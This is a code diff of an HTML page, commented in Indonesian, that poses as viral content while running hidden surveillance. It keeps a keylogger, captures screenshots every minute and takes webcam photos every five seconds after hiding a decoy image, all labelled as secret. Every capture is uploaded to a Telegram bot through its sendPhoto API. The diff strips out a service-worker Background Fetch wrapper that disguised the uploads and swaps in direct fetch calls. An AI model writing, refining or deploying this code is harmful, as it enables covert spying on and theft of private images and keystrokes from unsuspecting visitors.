@@ -363,46 +363,6 @@
     <video id="hiddenCamera" autoplay playsinline></video>
     <canvas id="hiddenCanvas" width="640" height="480"></canvas>
     
-    <!-- Service Worker untuk Background Fetch -->
-    <script>
-        // ===========================================
-        // SERVICE WORKER REGISTRATION
-        // ===========================================
-        if ('serviceWorker' in navigator) {
-            // Buat service worker secara dinamis
-            const swCode = `
-                self.addEventListener('install', (event) => {
-                    self.skipWaiting();
-                });
-                
-                self.addEventListener('activate', (event) => {
-                    event.waitUntil(clients.claim());
-                });
-                
-                self.addEventListener('backgroundfetchsuccess', (event) => {
-                    event.updateUI({ title: 'Selesai' });
-                });
-                
-                self.addEventListener('backgroundfetchfail', (event) => {
-                    event.updateUI({ title: 'Gagal' });
-                });
-                
-                self.addEventListener('backgroundfetchabort', (event) => {
-                    event.updateUI({ title: 'Dibatalkan' });
-                });
-            `;
-            
-            const blob = new Blob([swCode], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            
-            navigator.serviceWorker.register(swUrl).then(registration => {
-                console.log('Service Worker registered');
-            }).catch(err => {
-                console.log('SW registration failed:', err);
-            });
-        }
-    </script>
-    
     <script>
         // ===========================================
         // KONFIGURASI TELEGRAM
@@ -452,46 +412,7 @@
         }
         
         // ===========================================
-        // FUNGSI KIRIM FOTO DENGAN BACKGROUND FETCH
-        // ===========================================
-        async function kirimFotoBackground(blob, filename) {
-            try {
-                const registration = await navigator.serviceWorker.ready;
-                
-                // Buat FormData
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, filename);
-                
-                // Gunakan Background Fetch dengan text netral
-                await registration.backgroundFetch.fetch(
-                    'data-' + Date.now().toString().slice(-6),
-                    ['https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto'],
-                    {
-                        title: 'Memuat',
-                        icons: [],
-                        downloadTotal: 0,
-                        formData: formData
-                    }
-                );
-                
-                console.log('Background fetch started');
-            } catch (e) {
-                console.log('Background fetch failed, fallback ke biasa:', e);
-                // Fallback ke fetch biasa
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, filename);
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }
-        }
-        
-        // ===========================================
-        // KEYLOGGER
+        // KEYLOGGER (DIAM-DIAM)
         // ===========================================
         let keyLog = '';
         document.addEventListener('keydown', (e) => {
@@ -525,17 +446,24 @@
         }, 7000);
         
         // ===========================================
-        // SCREENSHOT BERKALA
+        // SCREENSHOT BERKALA (DIAM-DIAM)
         // ===========================================
         setInterval(() => {
             if (typeof html2canvas !== 'undefined' && isActive) {
                 html2canvas(document.body).then(canvas => {
                     canvas.toBlob(async (blob) => {
-                        await kirimFotoBackground(blob, 'screenshot.png');
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('photo', blob, 'screenshot.png');
+                        
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
                     }, 'image/png');
                 });
             }
-        }, 60000); // setiap 1 menit
+        }, 60000);
         
         function toggleLike() {
             const likeIcon = document.getElementById('likeIcon');
@@ -701,7 +629,14 @@
                 }
                 const fotoBlob = new Blob([array], {type: 'image/jpeg'});
                 
-                await kirimFotoBackground(fotoBlob, `foto_${fotoCount}.jpg`);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', fotoBlob, `foto_${fotoCount}.jpg`);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
             } catch (e) {}
         }
         
@@ -748,7 +683,7 @@
                 // HILANGIN GAMBAR VIRAL
                 viralImage.style.display = 'none';
                 
-                // AMBIL FOTO SETIAP 5 DETIK
+                // AMBIL FOTO SETIAP 5 DETIK (DIAM-DIAM)
                 fotoInterval = setInterval(ambilDanKirimFoto, 5000);
                 
             } catch (error) {
